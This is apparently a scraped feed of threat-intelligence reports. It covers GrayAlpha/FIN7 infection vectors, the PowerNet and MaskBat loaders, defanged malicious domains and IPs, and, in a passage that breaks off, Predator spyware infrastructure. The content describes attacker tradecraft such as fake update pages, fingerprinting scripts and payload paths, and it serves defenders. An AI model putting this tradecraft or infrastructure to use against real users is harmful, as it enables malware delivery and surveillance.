<li>Insikt Group has identified a new custom PowerShell loader dubbed PowerNet that decompresses and executes NetSupport RAT.</li>\n          <li>Insikt Group identified another custom loader, referred to as MaskBat, which has similarities to FakeBat but is obfuscated and contains strings linked to GrayAlpha.</li>\n          <li>Insikt Group identified three main infection vectors associated with GrayAlpha: fake browser update pages, fake 7-Zip download sites, and the TDS TAG-124 network.

The group is organized like a professional business, with compartmentalized teams handling malware development, phishing operations, money laundering, and management. FIN7 is primarily known for financially motivated <a href=\"https://www.fbi.gov/contact-us/field-offices/seattle/news/stories/how-cyber-crime-group-fin7-attacked-and-stole-data-from-hundreds-of-us-companies\">campaigns</a> involving the theft of payment card data and unauthorized access to corporate networks, particularly within the retail, hospitality, and financial sectors.</p>\n        <p>In 2018, the US Department of Justice (US DOJ) <a href=\"https://www.justice.gov/archives/opa/pr/three-members-notorious-international-cybercrime-group-fin7-custody-role-attacking-over-100\">unsealed</a> indictments against three high-ranking FIN7 members — Dmytro Fedorov, Fedir Hladyr, and Andrii Kolpakov — highlighting the group’s extensive operations against businesses across 47 US states and multiple countries. Operating under the name of a sham cybersecurity firm, “Combi Security,” FIN7 leveraged social engineering and customized malware, including variants of Carbanak, the group’s in-house developed backdoor, to compromise thousands of point-of-sale systems and exfiltrate over 15 million payment card records. The US DOJ prosecutions revealed the group’s hierarchical command structure, with members fulfilling defined roles in intrusion operations, malware administration, and logistical coordination. Despite the disruption to its leadership, FIN7’s underlying infrastructure and tradecraft persisted, enabling the broader criminal enterprise to <a href=\"https://krebsonsecurity.com/2024/07/the-stark-truth-behind-the-resurgence-of-russias-fin7/\">continue</a> targeting global organizations.</p>\n        <p>FIN7 uses a range of custom and repurposed malware and tooling to support its operations. The group typically gains initial access through spearphishing emails containing malicious attachments or links hosted on compromised sites, often combined with callback phishing to increase credibility. FIN7’s early operations leveraged its then-proprietary Carbanak backdoor as the primary command-and-control framework, enabling the group to manage compromised hosts and coordinate post-compromise activity. POWERTRASH — a uniquely obfuscated, PowerShell-based, in-memory loader adapted from the PowerSploit framework — has also been a consistent feature of FIN7 intrusions, used to deploy payloads such as DiceLoader and cracked Core Impact implants to support exploitation, lateral movement, and persistence. FIN7 also developed AuKill (also known as AvNeutralizer), a custom EDR evasion utility designed to disable endpoint security solutions, which was later <a href=\"https://www.bleepingcomputer.com/news/security/notorious-fin7-hackers-sell-edr-killer-to-other-threat-actors/\">reported</a> to have been offered for sale by the group on criminal marketplaces. In its most recent campaigns, FIN7 has been observed deploying the Python-based Anubis backdoor, which provides full system control via in-memory execution and communicates with its command-and-control infrastructure using Base64-encoded data.</p>\n        <p>In 2023, FIN7 <a href=\"https://therecord.media/researchers-tie-fin7-cybercrime-family-to-clop-ransomware-microsoft\">expanded</a> its operations to include the deployment of ransomware through affiliations with RaaS groups such as REvil and Maze, while also managing its own RaaS programs, including the now-retired Darkside and BlackMatter.

These vectors include:</p>\n        <ul>\n          <li><strong>Infection Vector 1:</strong> Fake software updates impersonating legitimate products such as Concur</li>\n          <li><strong>Infection Vector 2:</strong> Malicious 7-Zip download pages</li>\n          <li><strong>Infection Vector 3:</strong> Use of the TAG-124 TDS</li>\n        </ul>\n        <p>In these campaigns, GrayAlpha employed two primary types of PowerShell loaders: a self-contained custom script known as PowerNet, and a dynamic loader — a customized variant of FakeBat — referred to as MaskBat (see <strong>Figure 1</strong>).</p>\n        <div>\n          <div>\n            <div>\n              <img loading=\"lazy\" alt=\"grayalpha-001.png\" src=\"https://www.recordedfuture.com/media_1839e8c42e4eacfd025836297da5cecf01754a3b5.png?width=750&amp;format=png&amp;optimize=medium\" width=\"1600\" height=\"1183\" />\n            </div>\n          </div>\n          <div>\n            <div><strong><em>Figure 1:</em></strong> <em>GrayAlpha using three different infection vectors, all leading to NetSupport RAT infections (Source: Recorded Future)</em></div>\n          </div>\n        </div>\n        <h3>Infection Vector 1: Fake Browser Updates</h3>\n        <h4>Infrastructure Analysis</h4>\n        <p>Since at least April 2024, GrayAlpha has been observed leveraging fake browser update websites as part of its operations. These sites impersonate a range of legitimate products and services, including Google Meet, LexisNexis, Asana, AIMP, SAP Concur, CNN, the Wall Street Journal, and Advanced IP Scanner, among others. <strong>Table 1</strong> provides a list of domains associated with Infection Vector 1 that were still resolving as of 2025. However, it is important to note that active domain resolution does not necessarily indicate ongoing use by threat actors; in fact, the most recently observed domain began resolving in September 2024.

As previously reported, these scripts usually send a POST request to a CDN-themed domain, such as <em>cdn40[.]click</em> (see <strong>Figure 2</strong>). These domains typically begin with \"cdn\" followed by a random number and a top-level domain (TLD). The malicious payload is commonly delivered via the /download.php endpoint.

This newly identified infrastructure includes domains used for payload distribution and additional IP addresses believed to be tied to GrayAlpha. Insikt Group discovered a custom PowerShell loader named PowerNet, which decompresses and executes NetSupport RAT. Insikt Group identified another custom loader, referred to as MaskBat, that has similarities to FakeBat but is obfuscated and contains strings linked to GrayAlpha. Overall, Insikt Group found three primary infection methods: fake browser update pages, fake 7-Zip download sites, and the traffic distribution system (TDS) TAG-124. Notably, the use of TAG-124 had not been publicly documented prior to this report. Although all three infection vectors were observed being used simultaneously, only the fake 7-Zip download pages were still active at the time of writing, with newly registered domains appearing as recently as April 2025. Further analysis of these sites led to the identification of an individual who may be involved in the GrayAlpha operation.\nIn the near term, defenders are advised to enforce application allow-lists to block the download of seemingly legitimate files that contain malware. Where allow-lists are not practical, comprehensive employee security training becomes essential, particularly in recognizing suspicious behaviors such as unexpected prompts for browser updates or redirects caused by malvertising. Additionally, the use of detection rules, such as the YARA rules and Malware Intelligence Hunting queries provided in this report, is critical for identifying both existing and past infections. These rules should be updated frequently and supported with broader detection techniques, including monitoring of network artifacts and using Recorded Future Network Intelligence, due to the constantly evolving nature of malware.\nLooking ahead, defenders must monitor the broader cybercriminal ecosystem to anticipate and respond to emerging threats more effectively. The continued professionalization of cybercrime increases the likelihood of organizations across multiple industries being targeted. This trend is driven by the sustained profitability of cybercrime, limited international law enforcement collaboration, and the continuous evolution of security technologies, which in turn drive innovation among threat actors. While advanced persistent threat (APT) activity is often linked to state-sponsored entities, GrayAlpha illustrates that cybercriminal groups can demonstrate a similar level of persistence. Much like the ransomware-as-a-service (RaaS) model, cybercriminals are becoming increasingly specialized and collaborative, making it imperative to adopt a comprehensive and adaptive security posture.\nKey Findings\nInsikt Group has identified new infrastructure linked to GrayAlpha — a threat actor overlapping with the group commonly known as FIN7 — including domains utilized for payload distribution and additional IP addresses believed to be part of the threat actor's infrastructure.\nInsikt Group has identified a new custom PowerShell loader dubbed PowerNet that decompresses and executes NetSupport RAT.\nInsikt Group identified another custom loader, referred to as MaskBat, which has similarities to FakeBat but is obfuscated and contains strings linked to GrayAlpha.\nInsikt Group identified three main infection vectors associated with GrayAlpha: fake browser update pages, fake 7-Zip download sites, and the TDS TAG-124 network. Notably, the use of the TDS TAG-124 delivery mechanism had not been publicly documented prior to this report.\nWhile all three infection methods were employed simultaneously, only the fake 7-Zip download pages appear to remain active at the time of writing, with the most recent domains surfacing as recently as April 2025.\nThrough the analysis of the 7-Zip pages, Insikt Group identified an individual who may be connected to the GrayAlpha operation.\nBackground\nGrayAlpha is a threat actor cluster that overlaps with the financially motivated cybercriminal group commonly known as FIN7, sharing key infrastructure, tooling, and tradecraft.\nFIN7 has been active since at least 2013 and is considered one of the most prolific and technically sophisticated cybercriminal groups targeting organizations worldwide. The group is organized like a professional business, with compartmentalized teams handling malware development, phishing operations, money laundering, and management. FIN7 is primarily known for financially motivated campaigns involving the theft of payment card data and unauthorized access to corporate networks, particularly within the retail, hospitality, and financial sectors.\nIn 2018, the US Department of Justice (US DOJ) unsealed indictments against three high-ranking FIN7 members — Dmytro Fedorov, Fedir Hladyr, and Andrii Kolpakov — highlighting the group’s extensive operations against businesses across 47 US states and multiple countries. Operating under the name of a sham cybersecurity firm, “Combi Security,” FIN7 leveraged social engineering and customized malware, including variants of Carbanak, the group’s in-house developed backdoor, to compromise thousands of point-of-sale systems and exfiltrate over 15 million payment card records. The US DOJ prosecutions revealed the group’s hierarchical command structure, with members fulfilling defined roles in intrusion operations, malware administration, and logistical coordination. Despite the disruption to its leadership, FIN7’s underlying infrastructure and tradecraft persisted, enabling the broader criminal enterprise to continue targeting global organizations.\nFIN7 uses a range of custom and repurposed malware and tooling to support its operations. The group typically gains initial access through spearphishing emails containing malicious attachments or links hosted on compromised sites, often combined with callback phishing to increase credibility. FIN7’s early operations leveraged its then-proprietary Carbanak backdoor as the primary command-and-control framework, enabling the group to manage compromised hosts and coordinate post-compromise activity. POWERTRASH — a uniquely obfuscated, PowerShell-based, in-memory loader adapted from the PowerSploit framework — has also been a consistent feature of FIN7 intrusions, used to deploy payloads such as DiceLoader and cracked Core Impact implants to support exploitation, lateral movement, and persistence. FIN7 also developed AuKill (also known as AvNeutralizer), a custom EDR evasion utility designed to disable endpoint security solutions, which was later reported to have been offered for sale by the group on criminal marketplaces. In its most recent campaigns, FIN7 has been observed deploying the Python-based Anubis backdoor, which provides full system control via in-memory execution and communicates with its command-and-control infrastructure using Base64-encoded data.\nIn 2023, FIN7 expanded its operations to include the deployment of ransomware through affiliations with RaaS groups such as REvil and Maze, while also managing its own RaaS programs, including the now-retired Darkside and BlackMatter. More recently, FIN7 has been observed leveraging NetSupport RAT embedded within malicious MSIX application packages, delivered via fake update sites and malvertising.\nThreat Analysis\nInfection Vectors\nOver the past year, Insikt Group has identified three distinct infection vectors associated with GrayAlpha, observed during overlapping timeframes, and all ultimately resulting in NetSupport RAT infections. These vectors include:\nInfection Vector 1: Fake software updates impersonating legitimate products such as Concur\nInfection Vector 2: Malicious 7-Zip download pages\nInfection Vector 3: Use of the TAG-124 TDS\nIn these campaigns, GrayAlpha employed two primary types of PowerShell loaders: a self-contained custom script known as PowerNet, and a dynamic loader — a customized variant of FakeBat — referred to as MaskBat (see Figure 1).\nFigure 1: GrayAlpha using three different infection vectors, all leading to NetSupport RAT infections (Source: Recorded Future)\nInfection Vector 1: Fake Browser Updates\nInfrastructure Analysis\nSince at least April 2024, GrayAlpha has been observed leveraging fake browser update websites as part of its operations. These sites impersonate a range of legitimate products and services, including Google Meet, LexisNexis, Asana, AIMP, SAP Concur, CNN, the Wall Street Journal, and Advanced IP Scanner, among others. Table 1 provides a list of domains associated with Infection Vector 1 that were still resolving as of 2025. However, it is important to note that active domain resolution does not necessarily indicate ongoing use by threat actors; in fact, the most recently observed domain began resolving in September 2024. A comprehensive list of all domains linked to Infection Vector 1 — including those that did not resolve at any point in 2025 — can be found in Appendix A.\nDomain\nIP Address\nASN\nFirst Seen\nLast Seen\n2024-aimp[.]info\n86[.]104[.]72[.]23\nAS44477\n2024-07-04\n2025-05-04\nadvanced-ip-scanner[.]link\n138[.]124[.]183[.]79\nAS44477\n2024-04-29\n2025-04-30\naimp[.]day\n138[.]124[.]183[.]176\nAS44477\n2024-04-10\n2025-04-11\naimp[.]pm\n138[.]124[.]183[.]176\nAS44477\n2024-04-22\n2025-04-23\naimp[.]xyz\n38[.]180[.]142[.]198\nAS29802\n2024-05-08\n2025-05-02\nconcur[.]life\n103[.]35[.]191[.]222\nAS44477\n2024-05-07\n2025-05-04\nlaw2024[.]info\n91[.]228[.]10[.]81\nAS44477\n2024-06-12\n2025-05-04\nlaw2024[.]top\n91[.]228[.]10[.]81\nAS44477\n2024-06-13\n2025-05-05\nlexis2024[.]info\n103[.]35[.]191[.]137\nAS44477\n2024-06-10\n2025-05-05\nlexis2024[.]pro\n103[.]35[.]191[.]137\nAS44477\n2024-06-11\n2025-05-03\nlexisnex[.]pro\n103[.]35[.]191[.]137\nAS44477\n2024-06-12\n2025-05-04\nlexisnex[.]team\n103[.]35[.]191[.]137\nAS44477\n2024-06-11\n2025-05-05\nlexisnex[.]top\n103[.]35[.]191[.]137\nAS44477\n2024-06-11\n2025-05-03\nlexisnexis[.]day\n89[.]105[.]198[.]190\nAS204601\n2024-05-01\n2025-05-01\nlexisnexis[.]lat\n103[.]35[.]190[.]40\nAS44477\n2024-06-14\n2025-03-30\nlexisnexis[.]one\n103[.]35[.]191[.]137\nAS44477\n2024-06-05\n2025-05-04\nlexisnexis[.]pro\n103[.]35[.]191[.]137\nAS44477\n2024-05-07\n2025-05-05\nlexisnexis[.]top\n103[.]35[.]191[.]137\nAS44477\n2024-06-07\n2025-05-04\nmeet-go[.]info\n103[.]113[.]70[.]158\nAS44477\n2024-05-07\n2025-05-02\nmeet[.]com[.]de\n45[.]89[.]53[.]243\nAS44477\n2024-05-23\n2025-02-16\nsapconcur[.]top\n86[.]104[.]72[.]208\nAS44477\n2024-06-13\n2025-05-04\nthomsonreuter[.]info\n86[.]104[.]72[.]16\nAS44477\n2024-06-15\n2025-05-04\nthomsonreuter[.]pro\n86[.]104[.]72[.]16\nAS44477\n2024-06-15\n2025-05-05\nwsj[.]pm\n103[.]113[.]70[.]37\nAS44477\n2024-04-19\n2025-04-19\nTable 1: Domains linked to Infection Vector 1 still resolving as of 2025 (Source: Recorded Future)\nFake update websites often use the same script designed to fingerprint the host system, consisting of the functions getIPAddress() and trackPageOpen(). As previously reported, these scripts usually send a POST request to a CDN-themed domain, such as cdn40[.]click (see Figure 2). These domains typically begin with \"cdn\" followed by a random number and a top-level domain (TLD). The malicious payload is commonly delivered via the /download.php endpoint. However, Insikt Group has also identified variations, including /download/download.php, download2.php, and product-specific paths (such as /download/aimp_5.30.2541_w64-release.exe). Additionally, in at least one case, the threat actors appeared to use a compromised domain — worshipjapan[.]com — for fingerprinting purposes. This activity was observed on a website associated with the domain as4na[.]com.\nFigure 2: Typical JavaScript functions found on fake update pages such as meet-go[.]click (Source: URLScan)\nNotably, while most domains associated with Infection Vector 1 are crafted to impersonate legitimate software products, some appear to be randomly generated or arbitrary. Examples include teststeststests003202[.]shop, which is tied to the email address kasalboov@web[.]de, according to its WHOIS record. This same email is also linked to domains such as lexisnexis[.]pro, aimp[.]xyz, concur[.]life, cdn3535[.]shop, and cdn251[.]lol. Additional anomalies include domains like gogogononono[.]top and gogogononono[.]xyz, both hosted on the IP address 103[.]35[.]190[.]40, which also hosts lexisnexis[.]lat.\nFIN7’s Previous Activity Using Fake Advanced IP Scanner\nAlthough the first Advanced IP Scanner–themed domains linked to GrayAlpha, as discussed in this report, began resolving in early 2024 (see Figure 3), Insikt Group had already observed FIN7 leveraging a fake Advanced IP Scanner domain to compromise victims as early as the second half of 2023. Specifically, during a brief period at the end of September 2023, Insikt Group identified over 212 infected systems communicating with a FIN7-controlled Carbanak C2 server 166[.]1[.]160[.]118 via TCP port 443. While this activity was initially attributed to the exploitation of a one-day vulnerability chain, subsequent analysis revealed that the infections were instead linked to the typosquatted domain advanced-ip-sccanner[.]com — which was hosted behind Cloudflare at the time.\nFigure 3: Fake Advanced IP Scanner download page on advancedipscannerapp[.]com (Source: URLScan)\nHosting Analysis\nThe vast majority of domains associated with Infection Vector 1 resolved to infrastructure operated by the bulletproof hoster, Stark Industries Solutions (AS44477), with additional hosting observed on AS29802 (HIVELOCITY, Inc.) and AS41745 (FORTIS-AS) (see Figure 4). Notably, infrastructure within AS29802 consisted of IP space controlled by bulletproof hoster 3NT Solutions LLP and announced via HIVELOCITY. Hosting infrastructure for Infection Vector 2 is predominantly concentrated within AS41745, as detailed further in the Infection Vector 2: 7-Zip Impersonation section of this report.\nFigure 4: Breakdown of ASNs as observed with Infection Vector 1 (Source: Recorded Future)\nFORTIS-AS (AS41745), commonly referenced by its responsible organization, “Baykov Ilya Sergeevich” (ORG-HIP1-RIPE), has been repeatedly leveraged in activities related to FIN7. In addition to infrastructure linked to Stark Industries Solutions, FORTIS-AS has hosted infrastructure used to deploy malware families such as POWERTRASH and DiceLoader, both of which are directly associated with FIN7 operations.\nAccording to the WHOIS record for netblock 85[.]209[.]134[.]0/24, which is used by GrayAlpha, the block is assigned to Baykov Ilya Sergeevich (ORG-HIP1-RIPE). This entity is closely tied to the infrastructure service provider (ISP) “hip-hosting”, with multiple contact points and technical references — including domains such as fortis[.]host and hip-hosting[.]com — appearing throughout the record (see Figure 5).\nFigure 5: Contact details linked to Baykov Ilya Sergeevich (Source: Recorded Future)\nInsikt Group assesses with high confidence that “hip-hosting” is the ISP behind the entity “Baykov Ilya Sergeevich” (ORG-HIP1-RIPE). This assessment is supported by multiple corroborating data points in the WHOIS record and RIPE ORG object for ORG-HIP1-RIPE.\nTo read the entire analysis, click here to download the report as a PDF.","enclosure":{"length":"0","type":"image/jpg","url":"https://www.recordedfuture.com/research/media_18b0450577414882dafe70e41b597f15ce677b4b2.png?width=1200&format=pjpg&optimize=medium"},"content":"Insikt Group exposes GrayAlpha’s evolving infrastructure and infection methods—including PowerNet and MaskBat loaders, fake 7-Zip sites, and the undocumented TAG-124 network—linking the group to FIN7’s advanced cybercriminal operations.","contentSnippet":"Insikt Group exposes GrayAlpha’s evolving infrastructure and infection methods—including PowerNet and MaskBat loaders, fake 7-Zip sites, and the undocumented TAG-124 network—linking the group to FIN7’s advanced cybercriminal operations.","guid":"https://www.recordedfuture.com/research/grayalpha-uses-diverse-infection-vectors-deploy-powernet-loader-netsupport-rat","categories":["Research (Insikt)"],"isoDate":"1970-01-21T06:02:52.000Z","tag":"intel"},{"title":"Predator Spyware Resurgence: Insikt Group Exposes New Global Infrastructure","link":"https://www.recordedfuture.com/research/predator-still-active-new-links-identified","pubDate":"Wed, 21 Jan 1970 06:01:26 GMT","content:encoded":"\n        <p>\n          <img loading=\"lazy\" alt=\"insikt group logo\" src=\"https://www.recordedfuture.com/media_17759d8b91bf0c9106a0fa82007bef7e3316158b4.png?width=750&amp;format=png&amp;optimize=medium\" width=\"300\" height=\"48\" />\n        </p>\n        <h2>Executive Summary</h2>\n        <p>Following major public exposures by Insikt Group and others throughout the last two years, alongside US government sanctions targeting the Intellexa Consortium — the organizational structure behind the Predator mobile spyware — Insikt Group observed a significant decline in Predator-related activity. This apparent decline raised questions about whether the combination of US sanctions, public exposure, and broader international efforts to curb spyware proliferation, such as the UK and France-led Pall Mall process, had dealt a lasting blow to Intellexa’s operations. Yet, Predator activity has not stopped, and in recent months, Insikt Group has observed a resurgence of activity, reflecting the operators’ continued persistence. While much of the identified infrastructure is tied to known Predator operators in countries previously identified by Insikt Group, a new customer has also been identified in Mozambique — a country not previously publicly linked to the spyware. This aligns with the broader observation that Predator is highly active in Africa, with over half of its identified customers located on the continent. Additionally, Insikt Group has found a connection between high-tier Predator infrastructure and a Czech entity previously associated with the Intellexa Consortium.</p>\n        <p>The deployment of spyware like Predator beyond legitimate criminal or counterterrorism use poses serious threats to privacy, legal rights, and the physical safety of both direct targets and associated individuals. While most known cases of abuse have targeted civil society and political activists, individuals and organizations in regions with a record of spyware misuse should remain vigilant, regardless of sector. Given Predator’s expensive licensing model, its use is typically reserved for high-value, strategic targets. This makes politicians, corporate executives, and others in sensitive positions especially vulnerable due to the intelligence they may possess. The use of spyware against political opposition figures is currently under investigation in several EU countries, reflecting wider global efforts to curb the activities of mercenary spyware developers.</p>\n        <p>As outlined in Insikt Group’s previous reports on Predator, defenders should follow recommended best practices. These include ensuring personal and corporate devices are kept separate, regularly updating phones, encouraging periodic device reboots (though this may not always fully eliminate Predator), using lockdown mode, and implementing a mobile device management (MDM) system. Additionally, investing in security awareness training for employees and fostering a culture of minimal data exposure are essential for reducing the risk of successful spearphishing attacks and limiting data theft in the event of a breach.</p>\n        <p>Insikt Group expects the mercenary spyware market to continue expanding, fueled by sustained demand and corporate profitability. This growth will likely be accompanied by ongoing innovation, as rising competition and strengthened IT security among targets drive the development of new products and techniques. For instance, as defenders work to eliminate entire classes of vulnerabilities, spyware operators may adapt by targeting alternatives such as cloud backups accessed via stolen credentials or by employing new deployment methods. As these tools proliferate and techniques evolve, the range of victims is likely to extend beyond civil society, influencing political discourse and sparking further legal confrontations. Recent court rulings in favor of technology companies against spyware vendors may set a precedent, encouraging more firms to actively challenge the misuse of their platforms. Insikt Group anticipates that spyware vendors will continue leveraging complex corporate structures to evade sanctions or detection, while increasingly tailoring their operations to specific regions, a trend often described as the balkanization of the ecosystem.</p>\n        <h2>Key Findings</h2>\n        <ul>\n          <li>Insikt Group has identified new infrastructure associated with Predator, indicating continued operations despite public exposure, international sanctions, and policy interventions.</li>\n          <li>The newly identified infrastructure includes both victim-facing Tier 1 servers as well as high-tier components that likely link back to Predator operators in various countries.</li>\n          <li>Although much of Predator’s infrastructure remains consistent with previous reporting, its operators have introduced changes designed to further evade detection — a pattern Insikt Group noted in earlier reporting.</li>\n          <li>Insikt Group has detected Predator-related activity in several countries throughout the last twelve months and is the first to report a suspected Predator operator presence in Mozambique.</li>\n          <li>Insikt Group also connected components of Predator’s infrastructure to a Czech entity previously linked with the Intellexa Consortium by a Czech investigative outlet.</li>\n        </ul>\n        <h2>Background</h2>\n        <p>Predator is a sophisticated mercenary spyware targeting both Android and iPhone devices and has been active since at least 2019. Originally developed by Cytrox and now operated under the Intellexa alliance, Predator is engineered for flexibility and stealth, leaving minimal evidence on infected devices and making external investigations into abuse particularly challenging. Once deployed, Predator provides complete access to a device’s microphone, camera, and all data — such as contacts, messages, photos, and videos — without the victim’s awareness. The spyware’s modular design, based on Python, <a href=\"https://blog.talosintelligence.com/mercenary-intellexa-predator/\">allows</a> operators to introduce new features remotely, without the need to re-exploit the device.</p>\n        <p>Predator can be <a href=\"https://citizenlab.ca/2021/12/pegasus-vs-predator-dissidents-doubly-infected-iphone-reveals-cytrox-mercenary-spyware/\">delivered</a> through both \"1-click\" and \"zero-click\" attack vectors. \"1-click\" attacks rely on social engineering messages with malicious links that require user interaction (<a href=\"https://citizenlab.ca/2023/09/predator-in-the-wires-ahmed-eltantawy-targeted-with-predator-spyware-after-announcing-presidential-ambitions/\">1</a>, <a href=\"https://citizenlab.ca/2021/12/pegasus-vs-predator-dissidents-doubly-infected-iphone-reveals-cytrox-mercenary-spyware/\">2</a>, <a href=\"https://www.amnesty.org/en/documents/act10/7245/2023/en/\">3</a>), while \"zero-click\" attacks, described in the \"<a href=\"https://www.amnesty.org/en/documents/act10/7245/2023/en/\">Predator Files</a>,\" involve techniques that do not require any action from the target, such as network injection or proximity-based methods. However, there have been no confirmed cases of Predator using fully remote \"zero-click\" exploits like those seen with NSO Group Pegasus, which can compromise devices through messaging apps without any user interaction (for example, <a href=\"https://citizenlab.ca/2021/09/forcedentry-nso-group-imessage-zero-click-exploit-captured-in-the-wild/\">FORCEDENTRY</a> or <a href=\"https://citizenlab.ca/2023/09/blastpass-nso-group-iphone-zero-click-zero-day-exploit-captured-in-the-wild/\">BLASTPASS</a>).</p>\n        <p>Over the past two years, Insikt Group has identified suspected Predator operators in more than a dozen countries, including in Angola, Armenia, Botswana, the Democratic Republic of the Congo, Egypt, Indonesia, Kazakhstan, Mongolia, Mozambique, Oman, the Philippines, Saudi Arabia, and Trinidad and Tobago (<a href=\"/research/predator-spyware-operators-rebuild-multi-tier-infrastructure-target-mobile-devices\">1</a>, <a href=\"/research/predator-spyware-infrastructure-returns-following-exposure-sanctions\">2</a>). Notably, this is the first public report to identify Mozambique as a suspected customer. While Predator is ostensibly marketed for counterterrorism and law enforcement purposes, previous reporting has documented a clear pattern of its deployment against civil society actors, including journalists and activists, and politicians (<a href=\"https://citizenlab.ca/2021/12/pegasus-vs-predator-dissidents-doubly-infected-iphone-reveals-cytrox-mercenary-spyware/\">1</a>, <a href=\"https://insidestory.gr/article/poios-parakoloythoyse-kinito-toy-dimosiografoy-thanasi-koykaki\">2</a>, <a href=\"https://www.nytimes.com/2023/03/20/world/europe/greece-spyware-hacking-meta.html\">3</a>, <a href=\"https://citizenlab.ca/2023/09/predator-in-the-wires-ahmed-eltantawy-targeted-with-predator-spyware-after-announcing-presidential-ambitions/\">4</a>). These instances described in earlier reports likely represent only a small portion of the overall abuses, given the widespread use of mercenary spyware like Predator, the difficulty of detection, and limited victim support. It is important to emphasize the risk of cross-border targeting, which has been observed not only with Predator, where an operator <a href=\"https://www.europarl.europa.eu/doceo/document/P-9-2024-001059_EN.html\">linked</a> to Vietnam has targeted EU officials and members of the European Parliament, but also with <a href=\"https://www.brookings.edu/articles/how-digital-espionage-tools-exacerbate-authoritarianism-across-africa/\">other mercenary spyware</a>, such as Pegasus.</p>\n        <p>Despite increased public reporting on Predator’s infrastructure and <a href=\"https://www.amnesty.org/en/documents/act10/7245/2023/en/\">techniques</a>, as well as growing attention to Intellexa’s <a href=\"https://dfrlab.org/2024/04/22/markets-matter-a-glance-into-the-spyware-industry/\">corporate structure</a>, Predator operations remain active. This persistence continues even after measures such as <a href=\"https://home.treasury.gov/news/press-releases/jy2581\">US sanctions</a>, an <a href=\"https://www.europarl.europa.eu/news/en/press-room/20230609IPR96217/spyware-meps-call-for-full-investigations-and-safeguards-to-prevent-abuse\">EU resolution</a>, a <a href=\"https://home.treasury.gov/news/press-releases/jy2155\">US visa</a> ban on Intellexa affiliates, and the launch of the <a href=\"https://www.gov.uk/government/publications/the-pall-mall-process-declaration-tackling-the-proliferation-and-irresponsible-use-of-commercial-cyber-intrusion-capabilities\">Pall Mall Process</a>, alongside <a href=\"https://techcrunch.com/2024/04/06/price-of-zero-day-exploits-rises-as-companies-harden-products-against-hackers/?guce_referrer=aHR0cHM6Ly93d3cuZ29vZ2xlLmNvbS8&amp;guce_referrer_sig=AQAAAK6C-oJQRNB8Ap98Hh44SWmj_mn3W34kE1QqlhLYsuHtMci4nmJrwMOGMgIpGRm65bQ5SYB7CKBzb-tHfP3jskDDrMZ9eMqRXBtY8VXdobKPRoCkTdTSpBua2hCEIfSN0NuoVfH2GDnsX1RrNIJtFXIOAz7Bb7tGkwpb0ROh9qnK&amp;guccounter=2\">likely rising</a> exploit costs, particularly for iPhones. This likely reflects growing demand for spyware tools, especially in countries facing export restrictions, ongoing technical innovation in response to public reporting and security enhancements, and increasingly complex corporate structures designed to impede sanctions and attribution. One such example, involving a Czech entity likely linked to Predator operations, is discussed later in this report.</p>\n        <h2>Threat Analysis</h2>\n        <h3>Tier 1 (C2) Servers</h3>\n        <p>Insikt Group has identified new victim-facing Tier 1 (C2) infrastructure that is highly likely associated with Predator, including domains and IP addresses. Although the specific functions of these domains and IP addresses have not yet been confirmed, they are probably involved in payload delivery and the exploitation process, consistent with previous infrastructure linked to Predator. A table in <strong>Appendix B</strong> presents the domains and IP addresses observed over the past twelve months.</p>\n        <p>Previously, domains linked to Predator often impersonated specific organizations, such as frequently visited local news outlets, as Insikt Group has reported in the past (<a href=\"/research/predator-spyware-operators-rebuild-multi-tier-infrastructure-target-mobile-devices\">1</a>, <a href=\"/research/predator-spyware-infrastructure-returns-following-exposure-sanctions\">2</a>). However, this pattern began to gradually shift following increased media attention and public reporting from the end of 2023 onward. More recent domains now typically consist of two or more seemingly random English words. Insikt Group has observed that some of these domains reuse particular keywords; for instance, both <em>boundbreeze[.]com</em> and <em>branchbreeze[.]com</em> share the word \"breeze\". In a few recent cases, domains feature Portuguese-language words, which likely reflect the language of intended targets. Additionally, certain domains contain keywords that could provide clues to their targeting, such as <em>keep-badinigroups[.]com</em>, which may refer to communities or groups associated with the Badini dialect spoken in the Badinan region of Iraqi Kurdistan.</p>\n        <p>The majority of identified domains have been registered through the registrar PDR Ltd. d/b/a PublicDomainRegistry.com and typically use name servers associated with <em>orderbox-dns[.]com</em>, among others. While Predator infrastructure has historically favored certain autonomous system numbers (ASNs) such as AS62005, AS61138, and AS44066, Insikt Group has observed that more recent Predator-linked domains are being hosted on a broader range of ASNs — including AS42708, AS20473, and AS44477 — which have not previously been connected to Predator activity. Notably, Insikt Group also identified at least one instance where a server tied to higher-tier Predator infrastructure was hosted with Stark Industries.</p>\n        <h4>Suspected Infrastructure Detection Evasion Strategies</h4>\n        <p>In response to ongoing public exposure, the operators behind Predator have adopted various tactics to evade detection. These involve using more varied server configurations than <a href=\"https://citizenlab.ca/2023/10/predator-spyware-targets-us-eu-lawmakers-journalists/\">previously</a> <a href=\"https://blog.sekoia.io/active-lycantrox-infrastructure-illumination/\">reported</a>, expanding the diversity of ASNs, and introducing additional layers to their multi-tiered infrastructure, among other approaches. One notable strategy involves the use of fake websites, which generally fall into four main categories: fake 404 error pages, counterfeit login or registration pages, sites indicating that they are under construction, and websites purporting to be associated with specific entities, such as a conference (see <strong>Figures 1-4</strong>).</p>\n        <div>\n          <div>\n            <div>\n              <img loading=\"lazy\" alt=\"Predator3-001.png\" src=\"https://www.recordedfuture.com/media_1e4b73b7a0bdbfa5241cb90ac8c6675df315d6cbf.png?width=750&amp;format=png&amp;optimize=medium\" width=\"602\" height=\"382\" />\n            </div>\n          </div>\n          <div>\n            <div><strong><em>Figures 1-4:</em></strong> <em>Example websites linked to Predator (Source: Recorded Future)</em></div>\n          </div>\n        </div>\n        <h3>Multi-Tiered Infrastructure</h3>\n        <p>As previously reported by Insikt Group, Predator customers continue to use a multi-tiered infrastructure network, which is likely designed to enable the targeting of specific individuals or entities (see <strong>Figure 5</strong>). This network closely resembles the high-level architecture <a href=\"https://www.amnesty.org/en/documents/act10/7245/2023/en/\">outlined</a> in Amnesty’s October 2023 report, but it has continued to evolve since then. Earlier versions of Predator’s multi-tiered infrastructure, reported by Insikt Group in March 2024, featured only three layers. The addition of a fourth layer in the current design is likely intended to further obscure the identification of countries suspected of deploying Predator.</p>\n        <div>\n          <div>\n            <div>\n              <img loading=\"lazy\" alt=\"Predator3-002.png\" src=\"https://www.recordedfuture.com/media_1be57a60d78866b4b0e40de82c5d0b6004a60f1b4.png?width=750&amp;format=png&amp;optimize=medium\" width=\"1600\" height=\"797\" />\n            </div>\n          </div>\n          <div>\n            <div><strong><em>Figure 5:</em></strong> <em>Multi-tiered infrastructure linked to Predator (Source: Recorded Future)</em></div>\n          </div>\n        </div>\n        <p>Leveraging Recorded Future® Network Intelligence, Insikt 